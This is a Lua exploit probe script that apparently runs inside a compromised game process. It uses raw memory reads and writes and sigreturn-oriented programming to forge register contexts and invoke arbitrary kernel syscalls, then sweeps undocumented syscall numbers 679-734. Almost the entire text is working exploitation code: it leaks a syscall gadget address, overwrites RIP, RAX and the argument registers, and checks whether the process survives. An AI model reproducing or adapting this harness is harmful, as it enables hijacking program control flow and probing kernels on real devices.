-- CRASH_CLASS: MODERATE
-- PROBE 147a: Sysent 679-734 survey via SROP
--
-- Previous sweep (make_syscall with zeros) killed at 677-707.
-- SROP gives proper syscall ABI with 6 args. Test if the kills were
-- due to bad dispatch (make_syscall) vs bad args vs no handler.
-- Start at 679 (skip 677/678 which crash the game).
-- Test each in isolation — if one kills, the rest are lost.

print("=== PROBE 147a: SYSENT 679-734 SROP ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", to_num(v))
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end
local function ua(v)
    if type(v) == "table" and v.h then
        return uint64(string.format("0x%X%08X", v.h, v.l))
    end
    return uint64(string.format("0x%X", to_num(v)))
end

local MC_S = 0x40
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)
local sc20 = make_syscall(20)

local pid = to_num(sc20())
print("pid=" .. pid)

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x200000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))

local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local base_rip = memory.read_qword(srop_ctx + MC_S + 0xA0)
local rh, rl = get_hi_lo(base_rip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

-- Full 6-arg SROP
local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC_S + 0xA0, sc_addr)   -- RIP → syscall
    wq(srop_ctx + MC_S + 0x38, uint64(num)) -- RAX = syscall number
    wq(srop_ctx + MC_S + 0x08, a1 or uint64(0)) -- RDI
    wq(srop_ctx + MC_S + 0x10, a2 or uint64(0)) -- RSI
    wq(srop_ctx + MC_S + 0x18, a3 or uint64(0)) -- RDX
    wq(srop_ctx + MC_S + 0x50, a4 or uint64(0)) -- R10
    wq(srop_ctx + MC_S + 0x28, a5 or uint64(0)) -- R8
    wq(srop_ctx + MC_S + 0x30, a6 or uint64(0)) -- R9
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    if not ok then return nil, "PCALL_FAIL" end
    return rv
end

-- Output buffer for syscalls that write data
local outbuf = gpu + 0x1000
local outlen = gpu + 0x1800

print("")
print("--- [A] Baseline: known syscalls via SROP ---")
local p = srop(20) -- getpid
print("[A] getpid(20)=" .. hex(p))
local u = srop(24) -- getuid
print("[A] getuid(24)=" .. hex(u))
print("[A] SROP confirmed working")

print("")
print("--- [B] Sysent 679-695 via SROP (zero args) ---")
-- Start conservatively: zero args, pcall catches kills
for num = 679, 695 do
    for off = 0, 0x3F, 4 do wd(outbuf + off, 0) end
    local rv, err = srop(num)
    if err then
        print("[B] sys " .. num .. " = PCALL_FAIL")
    elseif rv == nil then
        print("[B] sys " .. num .. " = nil")
    else
        print("[B] sys " .. num .. " = " .. hex(rv))
    end
    -- Check we're still alive
    local alive = to_num(sc20())
    if alive ~= pid then
        print("[B] PID CHANGED! was " .. pid .. " now " .. alive)
        break
    end
end

print("")
print("--- [C] Sysent 696-720 via SROP ---")
for num = 696, 720 do
    local rv, err = srop(num)
    if err then
        print("[C] sys " .. num .. " = PCALL_FAIL")
    elseif rv == nil then
        print("[C] sys " .. num .. " = nil")
    else
        print("[C] sys " .. num .. " = " .. hex(rv))
    end
    local alive = to_num(sc20())
    if alive ~= pid then
        print("[C] PID CHANGED!")
        break
    end
end

print("")
print("--- [D] Sysent 721-734 via SROP ---")
for num = 721, 734 do
    local rv, err = srop(num)
    if err then
        print("[D] sys " .. num .. " = PCALL_FAIL")
    elseif rv == nil then
        print("[D] sys " .. num .. " = nil")
    else
        print("[D] sys " .. num .. " = " .. hex(rv))
    end
    local alive = to_num(sc20())
    if alive ~= pid then
        print("[D] PID CHANGED!")
        break
    end
end

print("")
print("pid_final=" .. to_num(sc20()))
print("=== PROBE 147a COMPLETE ===")
